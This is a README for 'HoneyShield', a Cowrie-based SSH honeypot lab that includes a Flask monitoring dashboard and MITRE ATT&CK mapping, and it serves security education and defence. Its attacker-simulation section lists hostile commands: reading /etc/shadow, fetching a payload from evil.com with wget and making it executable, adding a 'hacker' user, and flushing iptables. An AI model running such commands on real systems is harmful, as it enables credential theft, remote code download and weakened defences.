# HoneyShield — Intelligent SSH Honeypot Intrusion Monitoring System

A **HoneyShield — Intelligent SSH Honeypot Intrusion Monitoring System** is a research-oriented SSH honeypot monitoring platform that combines deception technology, attacker behavior analytics and SOC-style threat intelligence into a unified real-time intrusion monitoring system.

Built using the **Cowrie** honeypot framework on a Kali Linux virtualized lab environment, HoneyShield captures attacker interactions, reconstructs attack chains, maps adversary techniques to the **MITRE ATT&CK** framework, and visualizes threat intelligence through a live **Flask-powered** dashboard.

The system transforms raw honeypot logs into actionable behavioral intelligence by integrating:

- MITRE ATT&CK technique mapping
- SOC-style quantitative risk scoring
- Behavioral attacker profiling
- Attack chain reconstruction
- Semantic threat intent tagging
- GeoIP-based origin tracking
- Real-time dashboard analytics

> This environment is intended for **education, security research, and controlled lab use** only.

---

## Project Objective

Traditional honeypots mainly collect logs and provide passive monitoring. **HoneyShield** extends this concept by introducing an intelligence-driven analysis layer capable of identifying attacker intent, profiling behavior patterns, reconstructing intrusion chains and prioritizing threats in real time.

The project simulates a **Security Operations Center (SOC)** workflow in a controlled laboratory environment.

---

## Core Features

**Deception Layer**
- Fake SSH server using Cowrie
- Emulated Debian/Linux shell
- Isolated honeynet deployment
- Safe interaction environment for attackers

**Attack Intelligence Engine**
- MITRE ATT&CK TTP mapping
- Behavioral profiling engine
- Semantic threat intent tagging
- Attack chain reconstruction
- SOC-style threat risk scoring

**Monitoring & Visualization**
- Real-time Flask dashboard
- GeoIP attack source mapping
- Live session monitoring
- Credential analytics
- Threat distribution metrics
- Interactive session timelines

**Forensic Evidence Collection**
- Structured JSON event logging
- Session TTY recordings
- Command history capture
- Authentication event monitoring
---

## Lab Architecture

```text
                              ┌──────────────────────────────┐
                              │        Attacker VM           │
                              │        Kali Linux            │
                              │   IP: 192.168.100.20         │
                              │                              │
                              │ SSH Client / Attack Tools    │
                              └──────────────┬───────────────┘
                                             │
                                             │ SSH Connection
                                             │ Port 2222
                                             ▼
═══════════════════════════════════════════════════════════════════
                     Isolated Honeynet Environment
═══════════════════════════════════════════════════════════════════
                                             │
                                             ▼
                              ┌──────────────────────────────┐
                              │        Honeypot VM           │
                              │        Kali Linux            │
                              │   IP: 192.168.100.10         │
                              │                              │
                              │     Cowrie SSH Honeypot      │
                              └──────────────┬───────────────┘
                                             │
                                             ▼
                              ┌──────────────────────────────┐
                              │      Fake Linux Shell        │
                              │      (Emulated System)       │
                              │                              │
                              │ Captures attacker commands   │
                              └──────────────┬───────────────┘
                                             │
                                             ▼
                              ┌──────────────────────────────┐
                              │      Event Collection        │
                              │                              │
                              │ cowrie.json                  │
                              │ cowrie.log                   │
                              │ TTY recordings               │
                              └──────────────┬───────────────┘
                                             │
                                             ▼
                              ┌──────────────────────────────┐
                              │  Intelligence Analysis Core  │
                              │                              │
                              │ MITRE Mapping                │
                              │ Risk Scoring                 │
                              │ Behavior Profiling           │
                              │ Attack Chain Detection       │
                              │ Threat Intent Tagging        │
                              └──────────────┬───────────────┘
                                             │
                                             ▼
                              ┌──────────────────────────────┐
                              │      Flask SOC Dashboard     │
                              │                              │
                              │ Live Sessions                │
                              │ GeoIP Map                    │
                              │ Risk Metrics                 │
                              │ ATT&CK Matrix                │
                              │ Threat Analytics             │
                              └──────────────────────────────┘
```

---

## Network Configuration

This project uses **two VMs** connected via an **isolated internal network**:

| Machine | OS | Interface | IP Address |
|--------|----|-----------|------------|
| Honeypot VM | Kali Linux | `eth1` | `192.168.100.10/24` |
| Attacker VM | Kali Linux | `eth0` | `192.168.100.20/24` |

Cowrie listens on SSH port **2222** (honeypot port), so the attacker connects using:
```bash
ssh root@192.168.100.10 -p 2222
```
---

## Requirements
- 2× Virtual Machines (recommended)
  - **Honeypot VM:** Kali Linux + Cowrie
  - **Attacker VM:** Kali Linux (or any SSH client machine)
- Internal/host-only network configured between VMs
- Python3 and Flask installed
- Cowrie installed and configured under `~/cowrie`

---

## Setup & Run

### 1) Configure Network Interfaces

**On Honeypot VM**
```bash
sudo ip addr add 192.168.100.10/24 dev eth1
sudo ip link set eth1 up
```

**On Attacker VM**
```bash
sudo ip addr add 192.168.100.20/24 dev eth0
sudo ip link set eth0 up
```

(Optional) Verify connectivity (from attacker to honeypot):
```bash
ping -c 3 192.168.100.10
```

---

### 2) Run Cowrie Honeypot

On the **Honeypot VM**, open **Terminal 1**:

```bash
cd ~/cowrie
source cowrie-env/bin/activate
PYTHONPATH=src twistd -n cowrie
```

Keep this terminal running.

---

### 3) Run Alert Script

On the **Honeypot VM**, open **Terminal 2**:

```bash
cd ~/cowrie
./alert.sh
```

---

### 4) Run Dashboard (Flask UI)

On the **Honeypot VM**, open another terminal (or reuse one):

```bash
python3 app.py
```

Open the dashboard in the Honeypot VM browser:

```text
http://127.0.0.1:5000/
```

---

### 5) Simulate an Attacker (SSH into the Honeypot)

On the **Attacker VM**:

```bash
ssh root@192.168.100.10 -p 2222
```

Once connected, try typical attacker-style discovery commands (in a controlled lab):
```bash
id
whoami
uname -a
hostname
pwd
ls -la
cat /etc/passwd
cat /etc/shadow
history
wget http://evil.com/payload.sh
chmod +x payload.sh
crontab -l
useradd hacker
iptables -F
```

---

## Logs & Evidence

Cowrie records activity such as:
- authentication attempts
- commands entered
- session info
- (optionally) file download attempts and TTY recordings depending on Cowrie configuration

Common Cowrie log locations (may vary by config):
- JSON event logs: `~/cowrie/var/log/cowrie/cowrie.json`
- Text logs: `~/cowrie/var/log/cowrie/cowrie.log`
- Session recordings: `~/cowrie/var/lib/cowrie/tty/`

> If your dashboard/alert script reads from specific paths, ensure those match your Cowrie configuration.

---

## Demo Commands Captured
During testing, the attacker VM executed reconnaissance and post-compromise style commands including:
- system information enumeration (`uname`, `id`, etc.)
- basic credential and user enumeration
- simulated payload download attempts (e.g., `wget`, `curl`)

Cowrie successfully captured these actions for forensic analysis.

---

**Example Threat Analysis**

**Sample Session**

Event	Detection
| Event | Detection |
|---|---|
| Multiple failed logins | Brute Force Attempt |
| `uname -a` | System Discovery |
| `cat /etc/passwd` | Account Discovery |
| `wget payload.sh` | Malware Download |
| `chmod +x payload.sh` | Payload Preparation |

---

**Intelligence Output**
| Behavioral Profile | Malware Operator |
|---|---|
| Risk Score | 82/100 |
| Severity | Critical |
| ATT&CK Techniques | T1082, T1105, T1087 |
| Threat Intent | Malware Deployment |
| Attack Chain | Initial Access → Discovery → Payload Execution |

---

## Screenshots
Screenshots are available in [`screenshots/`](./screenshots):
- `01_honeypot_running.png`
- `02_attacker_ssh_login.png`
- `03_fake_shell_commands.png`
- `04_intrusion_logs.png`
- `05_Alert_detected.png`
- `06_Dashboard.png`
- `07_live_attack_flow.png`

---

## Troubleshooting

### SSH connection fails
- Confirm both VMs are on the same internal network.
- Confirm `eth1` is up and IPs are correct.
- Confirm Cowrie is running and listening on port `2222`:
  ```bash
  sudo ss -lntp | grep 2222
  ```

### Dashboard not loading
- Confirm Flask is running:
  ```bash
  python3 app.py
  ```
- Confirm you are opening:
  ```text
  http://127.0.0.1:5000/
  ```

### Alert script not triggering
- Confirm `alert.sh` has execute permission:
  ```bash
  chmod +x alert.sh
  ```
- Confirm it’s watching the correct log file path.

---

## Novelty
**HoneyShield** differentiates itself from traditional honeypot implementations by integrating:

- Real-time ATT&CK intelligence correlation
- Behavioral attacker archetyping
- SOC-style quantitative threat scoring
- Automated attack chain reconstruction
- Semantic intent inference
- Integrated geospatial threat visualization

## Disclaimer
 This project is intended strictly for:
- Cybersecurity education
- Security research
- Controlled laboratory environments

Do not deploy honeypots on networks you do not own or without explicit permission. The author is not responsible for misuse.
